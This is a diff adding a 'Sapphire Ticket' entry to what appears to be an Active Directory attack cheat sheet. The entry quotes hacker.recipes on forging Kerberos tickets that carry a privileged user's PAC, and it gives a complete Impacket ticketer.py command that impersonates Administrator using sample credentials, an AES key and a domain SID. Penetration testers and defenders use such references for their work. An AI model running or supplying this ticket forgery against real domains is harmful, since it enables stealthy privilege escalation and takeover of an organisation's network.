@@ -860,6 +860,13 @@ python pyForgeCert.py -i cert.pfx -o admin.pfx -pfx -p admin
 * https://github.com/Ridter/pyForgeCert
 * https://github.com/ly4k/Certipy
 
+### Sapphire Ticket
+As mentioned in [hacker.recipes](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/sapphire)
+> This is pretty much similar to the [Diamond Ticket](#diamond-ticket) but Sapphire tickets are an alternative to obtaining similar tickets in a stealthier way, by including a legitimate powerful user's PAC in the ticket. The powerful user's PAC can be obtained through an [S4U2self+u2u](/ad/movement/kerberos) trick.
+```
+# Impacket
+ticketer.py -request -user peter -password 'Password123' -domain range.net -aesKey 6a4b564a854e5ac474aca142874e1ca53167a71735dd6b08cc33247ae9941a86 -domain-sid S-1-5-21-2004564407-2130411480-2428574852 -impersonate Administrator 'Administrator'
+```
 
 ### msDS-AllowedToDelegateTo
 Note that the `msDS-AllowedToDelegateTo` is the user account flag which controls the services to which a user accounts has access to. This means, with enough privileges, it is possible to access any service from a target user.
